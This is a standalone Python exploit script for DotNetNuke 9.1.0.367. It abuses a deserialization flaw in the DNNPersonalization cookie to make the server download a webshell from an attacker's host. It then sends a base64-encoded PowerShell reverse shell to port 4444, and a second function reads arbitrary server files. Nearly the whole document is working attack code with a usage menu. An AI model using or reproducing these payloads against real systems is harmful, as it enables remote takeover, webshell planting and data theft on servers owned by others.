import sys
import re
import os
import hashlib
import requests
import threading
import urllib.parse
import argparse
import zipfile
import time
import base64
import string
import random
import itertools
import warnings
from io import BytesIO
from bs4 import BeautifulSoup
from colorama import Fore, Style

warnings.filterwarnings("ignore")
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def format_text(title, item):
    text = Style.BRIGHT + Fore.RED + title + Style.RESET_ALL + ': ' + str(item)
    return text

def get_reverse_shell(ip, listener_ip):
    print("[+] Downloading webshell from listener IP at port 80...")
    print("[+] Remember to setup your web server at port 80!")
    print("[+] You should also host the \"cmdasp.aspx\" in the web server!")

    deserialization_payload = '<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://%s/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>' % listener_ip

    random_path = str(''.join(random.choice('0123456789') for i in range(20)))
    url = "http://%s/dotnetnuke/%s" % (ip, random_path)
    headers = {"Cookie": "DNNPersonalization=" + deserialization_payload}
    r = requests.get(url, headers=headers, proxies=proxies)
    print("[+] The webshell should now be uploaded to http://%s/dotnetnuke/cmdasp.aspx" % ip)
    print("[+] Triggering the reverse shell. Remember to set up a listener on port 4444.")

    url = "http://%s/dotnetnuke/cmdasp.aspx" % ip
    r = requests.get(url)
    view_state = r.text.split('__VIEWSTATE" id="__VIEWSTATE" value="')[1].split('"')[0]
    event_validation = r.text.split('"__EVENTVALIDATION" id="__EVENTVALIDATION" value="')[1].split('"')[0]

    command = '$client = New-Object System.Net.Sockets.TCPClient("%s",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % listener_ip
    encoded_command = base64.b64encode(command.encode('utf-16le')).decode('utf-8')
    full_command = "powershell -enc " + encoded_command

    data = {
        "__VIEWSTATE": view_state,
        "__EVENTVALIDATION": event_validation,
        "txtArg": full_command,
        "testing": "execute"
    }
    r = requests.post(url, data=data, proxies=proxies)

def read_file(ip, file_path):
    print("[+] Reading the file at %s" % file_path)
    deserialization_payload = '<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">%s</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>' % file_path

    random_path = str(''.join(random.choice('0123456789') for i in range(20)))
    url = "http://%s/dotnetnuke/%s" % (ip, random_path)
    headers = {"Cookie": "DNNPersonalization=" + deserialization_payload}
    r = requests.get(url, headers=headers, proxies=proxies)
    data = r.text.split('</pre></table></table></table></table></table>')[0]
    print(format_text('The content at path %s is as follows' % file_path, '\n' + data))

class NewlineFormatter(argparse.RawTextHelpFormatter):
    def _split_lines(self, text, width):
        if text.startswith('R|'):
            return text[2:].splitlines()  
        return argparse.RawTextHelpFormatter._split_lines(self, text, width)

def main():
    parser = argparse.ArgumentParser(description='''
    Usage examples:
      - To get a reverse shell:
        python script.py -i <IP> -l <Listener IP>
    ''', formatter_class=NewlineFormatter)
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP Address is mandatory')
    parser.add_argument('-s', '--stage', type=str, help='Stage')
    parser.add_argument('-l', '--listener', type=str, help='Listener IP')
    parser.add_argument('-p', '--path', type=str, help='File path to read')
    args = parser.parse_args()

    ip = args.ip
    listener_ip = args.listener
    stage = args.stage
    file_path = args.path
    if stage == "get_reverse_shell" and listener_ip:
        get_reverse_shell(ip, listener_ip)
    elif stage == "read_file" and file_path:
        read_file(ip, file_path)
    
if __name__ == "__main__":
    main()
